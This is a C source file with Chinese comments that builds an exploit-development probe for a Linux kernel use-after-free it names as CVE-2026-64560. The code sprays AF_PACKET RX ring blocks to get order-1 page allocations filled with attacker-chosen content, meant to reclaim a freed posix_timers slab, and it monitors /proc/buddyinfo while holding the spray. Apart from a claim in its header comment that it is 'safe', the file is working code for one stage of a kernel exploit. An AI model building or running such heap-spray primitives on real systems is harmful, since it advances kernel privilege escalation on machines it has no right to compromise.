/*
 * afpacket_probe — 验证「用户态 order-N 页分配 + 内容可控」通道。
 *
 * 背景：CVE-2026-64560 的回收需要把内容放进刚被释放的 posix_timers slab。
 * 实测 /proc/slabinfo：posix_timers_cache = objsize 264 / 31 obj / 2 页 = order-1(8KB)。
 * 本机 kmalloc 里唯一 order-1 的 cache 是 kmalloc-256，但没有 264 字节周期、
 * 且 SLAB_FREELIST_RANDOM 会打乱对象发放顺序 ⇒ 无法用 kmalloc 做连续内容。
 * 能同时满足「order-1」+「连续可写内容」的是 AF_PACKET 的 RX ring：
 *     packet_set_ring() -> alloc_pg_vec() -> alloc_pages(order = get_order(tp_block_size))
 * 每个 block 是独立的一次页分配，内容由用户 mmap 后直接写。
 *
 * 本工具只做分配与自检，不碰任何漏洞路径，安全。
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <arpa/inet.h>

#ifndef PACKET_VERSION
#define PACKET_VERSION 10
#endif
#ifndef PACKET_RX_RING
#define PACKET_RX_RING 5
#endif

struct tpacket_req_local {
	unsigned int tp_block_size;
	unsigned int tp_block_nr;
	unsigned int tp_frame_size;
	unsigned int tp_frame_nr;
};

static int pin(int cpu)
{
	cpu_set_t s;

	if (cpu < 0)
		return 0;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	return sched_setaffinity(0, sizeof s, &s);
}

/* 读 /proc/buddyinfo 里 order 为 o 的空闲块总数（跨所有 zone） */
static long buddy_free(int order)
{
	FILE *f = fopen("/proc/buddyinfo", "r");
	char line[512];
	long total = 0;

	if (!f)
		return -1;
	while (fgets(line, sizeof line, f)) {
		char *p = strstr(line, "Normal");
		char *nums;
		int i = 0, n;
		char *tok, *save;

		if (!p) {
			p = strstr(line, "DMA32");
			if (!p)
				p = line;
		}
		nums = strchr(p, ':');
		if (!nums)
			continue;
		for (tok = strtok_r(nums + 1, " \n", &save); tok;
		     tok = strtok_r(NULL, " \n", &save), i++) {
			n = atoi(tok);
			if (i == order)
				total += n;
		}
	}
	fclose(f);
	return total;
}

static void buddy_dump(const char *tag)
{
	int o;

	printf("%s buddy free:", tag);
	for (o = 0; o <= 3; o++)
		printf("  o%d=%ld", o, buddy_free(o));
	printf("\n");
	fflush(stdout);
}

/* 分配一个 packet RX ring：nblocks 个 block，每块 block_size 字节。
 * 返回 mmap 基址（失败返回 NULL），并把每块填成 pattern。 */
static void *packet_ring_alloc(int block_size, int nblocks, int *sock_out,
			       const unsigned char *pattern, size_t patlen)
{
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	int ver = TPACKET_V1;
	struct tpacket_req_local req;
	void *ring;
	int i;

	if (s < 0) {
		printf("  socket(AF_PACKET) 失败 errno=%d (%s)\n", errno, strerror(errno));
		return NULL;
	}
	if (setsockopt(s, SOL_PACKET, PACKET_VERSION, &ver, sizeof ver)) {
		printf("  PACKET_VERSION 失败 errno=%d\n", errno);
		close(s);
		return NULL;
	}
	memset(&req, 0, sizeof req);
	req.tp_block_size = (unsigned)block_size;
	req.tp_block_nr = (unsigned)nblocks;
	req.tp_frame_size = (unsigned)block_size;
	req.tp_frame_nr = (unsigned)nblocks;
	if (setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof req)) {
		printf("  PACKET_RX_RING(%d x %d) 失败 errno=%d (%s)\n",
		       block_size, nblocks, errno, strerror(errno));
		close(s);
		return NULL;
	}
	ring = mmap(NULL, (size_t)block_size * nblocks, PROT_READ | PROT_WRITE,
		    MAP_SHARED, s, 0);
	if (ring == MAP_FAILED) {
		printf("  mmap ring 失败 errno=%d\n", errno);
		close(s);
		return NULL;
	}
	/* 每块写入 pattern（周期内容，跨块连续写也行；这里逐块写同样内容） */
	for (i = 0; i < nblocks; i++) {
		unsigned char *blk = (unsigned char *)ring + (size_t)i * block_size;

		memcpy(blk, pattern, patlen < (size_t)block_size ? patlen : (size_t)block_size);
	}
	*sock_out = s;
	return ring;
}

int main(int argc, char **argv)
{
	static unsigned char pat[0x2000];
	int sizes[] = { 4096, 8192, 16384, 32768 };
	int mode = argc > 1 ? atoi(argv[1]) : 0;   /* 0=sweep 1=hold */
	int hold_n = argc > 2 ? atoi(argv[2]) : 512;
	int cpu = argc > 3 ? atoi(argv[3]) : 2;
	int sidx;

	/* pattern：8 字节递增标记，便于确认内容真的落盘 */
	for (sidx = 0; sidx < (int)sizeof pat; sidx++)
		pat[sidx] = (unsigned char)(0x41 + (sidx & 0x0f));

	printf("=== AF_PACKET order-N 通道探测 (mode=%d hold_n=%d cpu=%d) ===\n",
	       mode, hold_n, cpu);
	printf("pin(%d) -> %d\n", cpu, pin(cpu));
	buddy_dump("基线  ");

	if (mode == 0) {
		/* 扫描 block_size：每种分配 256 块，观察哪个 order 的空闲块被消耗 */
		for (sidx = 0; sidx < (int)(sizeof sizes / sizeof sizes[0]); sidx++) {
			int s = -1, bs = sizes[sidx];
			void *ring;
			int n = 256;

			buddy_dump("  before");
			ring = packet_ring_alloc(bs, n, &s, pat, sizeof pat);
			if (!ring)
				continue;
			buddy_dump("  after ");
			printf("  block_size=%d n=%d 总量=%dKB -> OK (sock=%d)\n",
			       bs, n, bs * n / 1024, s);
			/* 校验内容可读回 */
			{
				unsigned char *blk = (unsigned char *)ring + bs;
				printf("  内容回读 @+%d: %02x %02x %02x %02x\n",
				       bs, blk[0], blk[1], blk[2], blk[3]);
			}
			munmap(ring, (size_t)bs * n);
			close(s);
			fflush(stdout);
		}
	} else {
		int s = -1;
		void *ring = packet_ring_alloc(8192, hold_n, &s, pat, sizeof pat);

		if (!ring)
			return 1;
		buddy_dump("持有  ");
		printf("已持有 %d 块 x 8192B = %dMB，sock=%d。保持 20s 供外部比对。\n",
		       hold_n, hold_n * 8 / 1024, s);
		fflush(stdout);
		sleep(20);
		munmap(ring, (size_t)8192 * hold_n);
		close(s);
		printf("已释放\n");
	}
	return 0;
}
